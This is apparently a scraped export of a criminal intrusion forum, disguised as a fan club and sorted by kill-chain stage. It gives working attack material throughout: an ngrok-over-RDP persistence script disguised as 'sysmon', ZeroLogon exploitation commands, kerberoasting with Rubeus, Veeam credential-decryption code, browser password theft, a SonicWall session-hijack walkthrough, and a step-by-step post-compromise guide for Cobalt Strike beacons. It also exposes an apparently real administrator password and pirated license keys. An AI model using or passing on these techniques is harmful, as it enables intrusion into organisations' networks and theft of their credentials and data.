@@ -1,0 +1,5466 @@
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Ngrok
+
+Ngrok
+Alter 2 55
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:33:04 am
+Recorded by
+
+Post
+
+Slice
+
+Administrator
+Member
+*****
+one
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : April 28, 2021, 10:10:10 pm
+Recorded by
+
+NGROK v2 (only official solution)
+
+register an account through which the connection will go on the site https://dashboard.ngrok.com/signup
+immediately request access on the page https://dashboard.ngrok.com/endpoints/status
+on the page https://dashboard.ngrok.com/get-started/setup we pick up ngrok.exe (https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip) and api key
+install_ngrok.ps1
+
+
+Code: [Highlight]
+
+function NewNgrok($apikey, $localngrok, $localnssm) {
+	if (!($apikey)) {throw "NGROK API KEY NEEDED"}
+	mkdir "C:\Windows\tmp"
+
+	if (!($localngrok) -or !(Test-path $localngrok)) {
+		write-output "download ngrok"
+		$clnt = new-object System.Net.WebClient
+		$url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
+		$file = "C:\Windows\tmp\ngrok.zip"
+		$clnt.DownloadFile($url,$file)
+	} else {
+		$file = $localngrok
+	}
+	
+	$shell_app=new-object -com shell.application
+	$zip_file = $shell_app.namespace($file)
+	$destination = $shell_app.namespace("C:\Windows\tmp\")
+	$destination.Copyhere($zip_file.items())
+
+	sleep 20
+
+	if (!($localnssm) -or !(Test-path $localnssm)) {
+		write-output "download nssm"
+		$clnt = new-object System.Net.WebClient
+		$url = "http://nssm.cc/release/nssm-2.24.zip"
+		$file = "C:\Windows\tmp\nssm.zip"
+		$clnt.DownloadFile($url,$file)
+	} else {
+		$file = $localnssm
+	}
+
+	$shell_app=new-object -com shell.application
+	$zip_file = $shell_app.namespace($file)
+	$destination = $shell_app.namespace("C:\Windows\tmp")
+	$destination.Copyhere($zip_file.items())
+
+
+	Rename-Item -Path "C:\Windows\tmp\ngrok.exe" -NewName "sysmon.exe"
+
+
+@"
+authtoken: $apikey
+tunnels:
+default:
+proto: tcp
+addr: 3389
+"@> "C:\Windows\tmp\config.yml"
+
+
+
+	cd "C:\Windows\tmp\nssm-2.24\win64"
+	.\nssm.exe install sysmon C:\Windows\tmp\sysmon.exe start --all --region us --config "C:\Windows\tmp\config.yml" --log "false"
+
+	Start-Service sysmon
+}
+
+
+powershell import install_ngrok.ps1
+psinject 123 x64 NewNgrok "APIKEY" OR if the script fails with downloading from resources, specify local archives
+psinject 123 x64 NewNgrok "APIKEY" "C:\path\to\ngrok.zip" "C:\path\to\nssm.zip"
+
+
+output:
+Quote
+
+Directory: C:\Windows
+
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d----- 4/28/2021 12:46PM tmp
+download ngrok
+download nssm
+S ervice "sysmon" installedsuccessfully!
+
+« Last Edit: April 29, 2021, 02:26:25 am by Slice »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Ngrok
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+IIS Patch Backdoor
+
+IIS Patch Backdoor
+Alter 1 25
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:43:38 am
+Recorded by
+
+post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+IIS Patch Backdoor
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Eternal Blue (MS17-010)
+
+Eternal Blue (MS17-010)
+Alter 1 37
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:48:14 am
+Recorded by
+
+Post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Eternal Blue (MS17-010)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+NetLogon (CVE-2020-1472)
+
+NetLogon (CVE-2020-1472)
+Alter 3 42
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:48:52 am
+Recorded by
+
+post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : Jul 01, 2021, 03:20:14 am
+Recorded by
+
+
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -reset
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -patch
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #2 : Jul 01, 2021, 03:42:54 am
+Recorded by
+
+Zero.exe of our development ::
+
+Quote
+
+USAGE: ZERO.EXE IP DC DOMAIN ADMIN_USERNAME [-c] COMMAND [-remote]:
+----------------------------------------------------
+where:
+IP - ip address of domain controller
+DC - domain controller name
+DOMAIN - domain name, eg home.local
+ADMIN_USERNAME - account name of the administrator. can be default <Administrator> or something else
+-c - optional, use it when command is not binary executable itself
+COMMAND - command that will be executed on domain controller. should be surrounded by quotes
+-remote - if target is outside of current subnet
+
+
+or
+
+ZERO.EXE -test IP DC
+to test if the target is vulnerable only
+
+
+Execution of the code on the DC of the vulnerable ZeroLogon:
+zero.exe 192.168.22.5 CCGPDC cccnetwork.com Administrator -c "whoami > C:\ProgramData\loggg5.txt"
+
+
+192.168.22.5 - ipak MPC
+GCCPDC - hostname PDC
+cccnetwork.com - domain
+Administrator - Any YES
+-c > command to be run from the system
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+NetLogon (CVE-2020-1472)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Kerberoasting
+
+Kerberoasting
+Alter 2 35
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:49:06 am
+Recorded by
+
+post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : Jul 01, 2021, 03:25:23 am
+Recorded by
+
+From cobalt >
+execute-assembly /home/user/txt/edu/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+
+From under the vpna of your car:
+
+----
+
+We carry out a kerberoasting attack through vpn from a non-domain car, having vpn credits
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+
+as you can see we do the same as in the normal attack, just add 3 new attributes:
+/dc: - specify the domain controller
+/creduser: - login of the domain user from which we are running
+/credpassword: - password of the domain user from which we are running
+
+from @cybercat
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Kerberoasting
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Finding available ADMIN$ shares
+
+Finding available ADMIN$ shares
+Alter 2 40
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:51:33 am
+Recorded by
+
+Post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : Jul 01, 2021, 03:23:51 am
+Recorded by
+
+powershell-import /home/user/soft/ShareFinder.ps1
+
+psinject 5209 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shares5.txt
+
+5209 x86 - your current process.
+
+Palit eset if I'm not mistaken
+
+Code: [Highlight]
+
+https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+Finding available ADMIN$ shares
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+AdFind Guide
+
+AdFind Guide
+Alter 3 60
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:52:02 am
+Recorded by
+
+Post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Answer #1 : March 15, 2021, 01:55:04 am
+Recorded by
+
+Code: [Highlight]
+
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=person)" > ad_users.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "objectcategory=computer" > ad_computers.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=organizationalUnit)" > ad_ous.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -sc trustdmp > trustdmp.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -subnets -f (objectCategory=subnet) > subnets.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -f "(objectcategory=group)" > ad_group.txt
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -gcb -sc trustdmp > trustdmp.txt
+
+adfind polling with LOGIN PASS DOMAIN WITHOU CONTEXT FROM NETWORK/VPN
+« Last Edit: March 15, 2021, 01:57:22 am by Rozetka »
+
+giovanni
+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+Reply #2 on June 11, 2021, 08:36:52 am
+Recorded by
+
+You can remove this:
+Code: [Highlight]
+
+adfind.exe -h 10.50.50.4 -b dc=optech,dc=local -u optech.local\administrator -up 9088JodyLynn7 -sc trustdmp > trustdmp.txt
+
+
+The last command overwrites anyway.
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+AdFind Guide
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+GPP Passwords
+
+GPP Passwords
+Alter 1 29
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+Profile View Private Message (Offline)
+
+: February 05, 2021, 11:53:30 am
+Recorded by
+
+post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Privilege Escalation »
+GPP Passwords
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+Decrypting Veeam passwords
+
+Decrypting Veeam passwords
+Alter 2 61
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 01:25:02 pm
+Recorded by
+
+post
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : February 11, 2021, 02:41:29 pm
+Recorded by
+
+edited by rz >
+
+tasklist /v (look for sqlservr and PID in netstat.ano, look for port in netstat by PID)
+netstat -ano
+Looking for MsSQL port by PID in 2 outputs
+looking for where is sqlcmd.exe
+
+Quote
+
+"c:\Program Files\Microsoft SQL Server\110\Tools\Binn\sqlcmd.exe" -S localhost,port found -E -y0 -Q "SELECT TOP (1000) [id],[user_name],[password], [usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];"
+
+
+option -y0 required otherwise sqlcmd cuts output
+
+then take this code
+
+Quote
+
+using System;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Main
+{
+internal static class Program
+{
+private static void Decrypt(string b,string a){
+if (string.IsNullOrEmpty(a))
+{
+return;
+}
+byte[] encryptedData = Convert.FromBase64String(a);
+Console.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.LocalMachine)));
+return;
+}
+private static void Main(string[] args)
+{
+Decrypt("optional username","hash from sqlcmd output here");
+}
+}
+}
+
+for each hash, a separate call to the Decrypt function
+Create a file
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\veeam1.cs
+The code that you put above in veeam1.cs
+Open cmd
+You go to hell
+Quote
+
+cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\
+
+Next, build the EXE like this:
+Quote
+
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe veeam1.cs
+
+
+You will run on a machine with Wiam FROM UNDER CMD (it spits out the password in cmd)
+Quote
+
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\veeam1.exe
+
+The output is a password
+
+All credits xuz
+
+fixed by rz
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+Decrypting Veeam passwords
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (subdrill.sh)
+
+Search for externally accessible subdomains (subdrill.sh)
+Alter 1 31
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 11, 2021, 02:02:59 am
+Recorded by
+
+A very [very] simple and pipe-able script for finding subdomains based on [free] online services without any dependency to API-keys for penetration testers and bug bounty hunters.
+
+usage:
+chmod +x Sub-Drill.sh
+
+./Sub-Drill.sh [Domain.Com] [optional-output-file]
+
+Used services:
+threatcrowd
+hackertarget
+crt.sh
+certspotter
+spyse.com
+bufferover.run [tls,dns]
+urlscan.io
+synapsint.com
+jldc.me (anubis)
+omnisint.io (SonarSearch)
+alienvault [otx]
+riddler.io
+suip.biz [Amass,Subfinder]
+rapiddns.io
+web.archive.org
+
+
+Code: [Highlight]
+
+curl --silent https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" > tmp.txt
+curl --silent https://api.hackertarget.com/hostsearch/?q=$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://crt.sh/?q=%.$1 | grep -oP "\<TD\>\K.*\.$1" | sed -e 's/\<BR\>/\n/g' | grep -oP "\K.*\.$1" | sed -e 's/[\<|\>]//g' | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://crt.sh/?q=%.%.$1 | grep -oP "\<TD\>\K.*\.$1" | sed -e 's/\<BR\>/\n/g' | sed -e 's/[\<|\>]//g' | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://crt.sh/?q=%.%.%.$1 | grep "$1" | cut -d '>' -f2 | cut -d '<' -f1 | grep -v " " | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort -u >> tmp.txt
+curl --silent https://crt.sh/?q=%.%.%.%.$1 | grep "$1" | cut -d '>' -f2 | cut -d '<' -f1 | grep -v " " | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort -u >> tmp.txt
+curl --silent https://certspotter.com/api/v0/certs?domain=$1 | grep -o '\[\".*\"\]' | sed -e 's/\[//g' | sed -e 's/\"//g' | sed -e 's/\]//g' | sed -e 's/\,/\n/g' | grep -o -E "[a- zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://spyse.com/target/domain/$1 | grep -E -o "button.*>.*\.$1\/button>" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://tls.bufferover.run/dns?q=$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://dns.bufferover.run/dns?q=.$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://urlscan.io/api/v1/search/?q=$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent -X POST https://synapsint.com/report.php -d "name=http%3A%2F%2F$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://jldc.me/anubis/subdomains/$1 | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([Az]))\w+" >> tmp .txt
+curl --silent https://sonar.omnisint.io/subdomains/$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://otx.alienvault.com/api/v1/indicators/domain/$1/passive_dns | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+curl --silent https://riddler.io/search/exportcsv?q=pld:$1 | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
+
+if [[ $# -eq 2 ]]; then
+cat tmp.txt | sed -e "s/\*\.$1//g" | sed -e "s/^\..*//g" | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort -u > $2
+else
+cat tmp.txt | sed -e "s/\*\.$1//g" | sed -e "s/^\..*//g" | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort-u
+fi
+rm -f tmp.txt
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (subdrill.sh)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+SonicWall SSL-VPN
+
+SonicWall SSL-VPN
+Alter 2 81
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 10:37:40 am
+Recorded by
+
+for those who need to work with SonicWall through browser sessions
+Using a Web Browser to Access
+
+- take the session from the script output, for example "47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg="
+- open the browser in incognito mode, open the developer console (js-console)
+- encode the session ID in base64
+>> btoa("47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg=") [ENTER]
+"NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0="
+- drive in the URL https://target (redirect to https://target/cgi-bin/welcome)
+- go to the console in application/cookies, add a cookie
+swap : NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0=
+- in the browser (where .../cgi-bin/welcome) edit the URL to https://target/cgi-bin/portal
+- get access to the resource under the user session
+« Last Edit: February 11, 2021, 02:11:01 am by Alter »
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : February 22, 2021, 10:28:27 pm
+Recorded by
+
+Sometimes you can pick up 2FA codes from the mail
+We collect subdomains through the subdomain search script
+Looking for mail
+We try to log in with the same one that we will enter the vpn, if we logged in, then we try to enter the vpn and take the 2fa code from the mail, enter it and log in. It worked a couple of times.
+By the way
+I HIGHLY DO NOT RECOMMEND sorting out accounts where there is on the first 2FA - if there is 2FA, then FOR DEFINITELY there is 2FA everywhere and if you do this, then every user who has received a notification with a 2FA code will come, they will inform the admin and they will cut you out.
+« Last Edit: February 24, 2021, 09:11:08 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+SonicWall SSL-VPN
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (pentest-tools.com)
+
+Search for externally accessible subdomains (pentest-tools.com)
+Alter 1 25
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 11, 2021, 02:04:41 am
+Recorded by
+
+Just enter the domain we are interested in using this link
+https://pentest-tools.com/information-gathering/find-subdomains-of-domain
+
+There is a limited number of credits, but it is decided by changing the socks / browser, as an option, use the Opera and the vpn built into it if several requests per day are required.
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (pentest-tools.com)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (aquatone)
+
+Search for externally accessible subdomains (aquatone)
+Alter 1 25
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 11, 2021, 02:06:10 am
+Recorded by
+
+rozetka cherkani please, you had a guide, I can't find it
+>
+
+There is a separate VPS with Kali OS on board.
+Using the trace tool
+It rolls like this (Applied for KALI, for other OS you need to install additional software)
+
+Quote
+
+gem install aquatone
+
+
+Use like this:
+Quote
+
+aquatone-discover --domain example.com
+
+or
+Quote
+
+aquatone-discover -d example.com
+
+
+At the output we get to a folder
+Code: [Highlight]
+
+/aquatone/examples.com/hosts.txt
+
+
+Hostnames ping from local network for backdooring (See Exchange webshell manual)
+« Last Edit: February 11, 2021, 02:18:01 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Search for externally accessible subdomains (aquatone)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Proxifier
+
+Proxifier
+Alter 1 15
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+Profile View Private Message (Offline)
+
+: February 11, 2021, 02:08:56 am
+Recorded by
+
+Litsuha's keys
+
+Code: [Highlight]
+
+PLZ92-LYS8J-ANV3S-SZRQ7-GPG3F
+5JZ6S-B3FKJ-49YYP-HCCQN-3JVHX
+TQZVQ-X36SC-SFZYC-TAC7E-BQF9S
+2VZ8M-BYC2A-A3Y3P-6LQQ5-HNDN8
+CJZXN-BWFDK-Q2Y2M-VSFCT-E7YLW
+6KZ2V-A2UXK-YAWWC-YJ9QG-MW4RG
+RSZXG-M2YDB-R5SWQ-3XR7Z-L42PN
+ULZCW-2YQNG-FL83G-9DGLR-9TFQA
+
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Other Tools »
+Proxifier
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Fast Guide
+
+Fast Guide
+Alter 2 67
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 11, 2021, 02:27:10 am
+Recorded by
+
+At the input, we have a regular bot with user rights and consider the first stage of work from this context.
+
+1. Collecting information about domain controllers in the network
+-net domain_controllers
+-netdclist
+-shell nltest /dclist:
+Most often, the first team out of three is enough, but if it does not give a result, you can try the rest.
+
+2. Collecting information about the composition of Active Directory using AdFind.exe
+- load adfind.exe and adf.bat into a writable folder
+- move the cobalt beacon to this folder
+- run shell adf.bat
+- wait for the script to finish
+- download the result and delete what was loaded on the machine
+
+3. Carry out a kerberoast attack
+- execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+- execute-assembly /home/omar/Desktop/Fast-Guide/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+- download the resulting files (if they gave the result)
+- if not issued, then we use an alternative powershell script to carry out the attack
+- powershell-import /home/omar/Desktop/Fast-Guide/Invoke-Kerberoast.ps1
+- psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
+4728 in this case is the current pid, and x86 is its bit depth
+(received hashes will be sent to brute to get cleartext passwords or will be used in the context of SYSTEM rights)
+
+4. We collect information from the Chrome browser to search for possible local cleatext credentials
+- execute-assembly /home/omar/Desktop/Fast-Guide/SharpChrome.exe logins /showall
+(here we get a set of passwords for the current user and some idea of the network and external resources where he goes)
+
+5. Request information about domain administrators and local administrators
+- shell net group "domain admins" /dom
+-shell net localgroup administrators
+
+6. We collect information on the current car using SeatBelt
+- execute-assembly /home/omar/Desktop/Fast-Guide/Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"
+(I don’t give explanations here, the number of checks there is decent and all the information collected is more or less important both on the local machine and on the network)
+   
+7. Checking for saved passwords in domain group policy files
+- execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe
+   
+8. We collect available shares and see if there are any $ADMIN shares available for our current user in the domain
+- powershell-import /home/omar/Desktop/Fast-Guide/ShareFinder.ps1
+- psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+(at the moment, the scan has gone and its result is being written to a file, the file will be fully sized when the scan is over and it can be downloaded)
+
+We put all utility output files into a folder with the name of the case, we write the beacon output into a separate creds.txt file that will be in this folder.
+* adf.bat (0.34 KB - downloaded 2 times.)
+* ShareFinder.ps1 (44.41 KB - downloaded 1 time.)
+* AdFind.exe (1361.5 KB - downloaded 3 times.)
+* Invoke-Kerberoast.ps1 (45.75 KB - downloaded 2 times.)
+
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+Answer #1 : February 11, 2021, 02:28:16 am
+Recorded by
+
+I recommend using all the utilities attached in the c# topic by collecting them from the sources on the github.
+* Net-GPPPassword.exe (9 KB - downloaded 1 time.)
+* Rubeus.exe (223 KB - downloaded 4 times.)
+* Seatbelt.exe (534 KB - downloaded 1 time.)
+* SharpChrome.exe (805.5 KB - downloaded 1 time.)
+
+Pages: 1
+
